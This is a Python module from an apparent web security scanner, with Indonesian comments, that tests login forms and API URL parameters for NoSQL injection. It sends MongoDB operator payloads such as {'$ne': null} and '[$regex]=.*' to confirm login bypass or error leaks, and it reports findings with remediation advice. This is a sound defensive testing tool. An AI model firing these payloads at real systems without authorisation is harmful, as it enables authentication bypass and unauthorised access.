"""NoSQL Injection probe — strict-validation v0.10.4.

Sebelumnya: flag jika body memuat ``welcome``/``dashboard`` dari halaman
manapun yang return 200 setelah disuntik operator Mongo. Banyak halaman
home punya kata "welcome" sehingga FP tinggi.

Sekarang konfirmasi:
- Baseline: kirim wrong-creds biasa (string). Server harus benar-benar
  menolak (status non-success ATAU body memuat failure hint).
- Test: kirim payload ``{"$ne": null}``. Berhasil HANYA jika baseline
  ditolak DAN payload diterima dengan body berbeda.
- Untuk error-leak NoSQL: signature error harus muncul di response
  payload TAPI tidak di response baseline.
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import (
    Finding,
    HttpClient,
    Severity,
    Target,
    ValidationProof,
    body_similarity,
    build_extra,
)
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

JSON_PAYLOADS = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}]
URL_PAYLOADS = ["[$ne]=null", "[$gt]=", "[$regex]=.*", "[$exists]=true"]
SUCCESS_HINT = ("welcome", "dashboard", "logout", "berhasil", "selamat")
FAIL_HINT = ("invalid", "salah", "error", "wrong", "incorrect", "gagal", "tidak ditemukan")
ERROR_HINT = ("mongo", "bson", "$ne", "couchdb", "$where", "syntaxerror in javascript")


def _login_form(config: ScanConfig) -> dict | None:
    s = get_state(config)
    if not s:
        return None
    for f in s.forms:
        if any((i.get("type") or "").lower() == "password" for i in f["inputs"]):
            return f
    return None


def _api_urls(config: ScanConfig) -> list[str]:
    s = get_state(config)
    if not s:
        return []
    return [u for u in s.param_urls if "/api/" in u or "/v1/" in u or "/v2/" in u][:5]


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # 1) Login bypass via Mongo operator — strict baseline-diff
        form = _login_form(config)
        if form and form.get("action"):
            user_field = next(
                (i["name"] for i in form["inputs"]
                 if (i.get("name") or "").lower() in ("username", "email", "user")),
                None,
            )
            pass_field = next(
                (i["name"] for i in form["inputs"]
                 if (i.get("type") or "").lower() == "password"),
                None,
            )
            if user_field and pass_field:
                base = client.post(
                    form["action"],
                    json={user_field: "cyberloka_invalid_user",
                          pass_field: "cyberloka_wrong"},
                )
                base_body = (base.text or "") if base is not None else ""
                base_low = base_body.lower()
                base_status = base.status_code if base is not None else 0
                base_rejected = (
                    base_status not in (200, 302)
                    or any(h in base_low for h in FAIL_HINT)
                )
                if base_rejected:
                    for payload in JSON_PAYLOADS:
                        body = {user_field: payload, pass_field: payload}
                        r = client.post(form["action"], json=body)
                        if r is None:
                            continue
                        text = r.text or ""
                        text_low = text.lower()
                        if (
                            r.status_code in (200, 302)
                            and any(h in text_low for h in SUCCESS_HINT)
                            and not any(h in text_low for h in FAIL_HINT)
                            and body_similarity(base_body, text) < 0.85
                        ):
                            proof = ValidationProof(
                                method="reject-baseline+success-diff",
                                confirmed=True,
                                steps=[
                                    "Baseline: kirim wrong-creds string -> "
                                    f"status {base_status}, ditolak.",
                                    f"Probe: kirim payload {payload} -> "
                                    f"status {r.status_code}, success hint muncul.",
                                    f"sim(base, probe) < 0.85 -> body berbeda signifikan.",
                                ],
                                samples=[f"payload={payload}, status={r.status_code}"],
                            )
                            findings.append(Finding(
                                module="nosqli", target=form["action"],
                                title=f"Bypass login NoSQL terkonfirmasi: {payload}",
                                severity=Severity.CRITICAL,
                                description=(
                                    "Endpoint login menolak kredensial salah biasa, "
                                    "tapi menerima MongoDB operator dan menampilkan "
                                    "halaman dashboard/welcome -> bypass otentikasi "
                                    "terkonfirmasi."
                                ),
                                evidence=f"payload={payload} status={r.status_code}",
                                cwe="CWE-943",
                                confidence="confirmed",
                                urls=[form["action"]],
                                remediation=(
                                    "Validasi tipe input (string saja), pakai "
                                    "parameterized query, jangan langsung pass body "
                                    "ke find()."
                                ),
                                extra=build_extra(proof=proof),
                            ))
                            return findings

        # 2) URL operator injection — error oracle
        for url in _api_urls(config):
            parsed = urlparse(url)
            params = list(parse_qsl(parsed.query))
            if not params:
                continue
            base = client.get(url)
            base_low = (base.text or "").lower() if base is not None else ""
            if any(e in base_low for e in ERROR_HINT):
                continue
            k0, _ = params[0]
            for op in URL_PAYLOADS:
                tail = "&".join(f"{k}={v}" for k, v in params[1:])
                new_q = (f"{k0}{op}" if not tail else f"{k0}{op}&{tail}")
                mutated = urlunparse(parsed._replace(query=new_q))
                r = client.get(mutated)
                if r is None:
                    continue
                t = (r.text or "").lower()
                if not any(e in t for e in ERROR_HINT):
                    continue
                proof = ValidationProof(
                    method="error-leak+baseline-clean",
                    confirmed=True,
                    steps=[
                        "Baseline GET URL biasa -> response TIDAK memuat keyword NoSQL.",
                        f"Probe `{k0}{op}` -> response memuat keyword NoSQL ({ERROR_HINT}).",
                    ],
                    samples=[f"payload={op}"],
                )
                findings.append(Finding(
                    module="nosqli", target=mutated,
                    title=f"Error NoSQL terkonfirmasi pada parameter `{k0}`",
                    severity=Severity.HIGH,
                    description=(
                        "Server membocorkan error MongoDB/CouchDB saat parameter "
                        "dimanipulasi sebagai operator, sementara baseline tidak "
                        "memuat keyword error tersebut."
                    ),
                    evidence=f"payload={op}; error in body, baseline clean",
                    cwe="CWE-943",
                    confidence="confirmed",
                    urls=[mutated],
                    remediation="Sanitize query param ke string, jangan auto-cast ke object.",
                    extra=build_extra(proof=proof),
                ))
                return findings
    finally:
        client.close()
    return findings
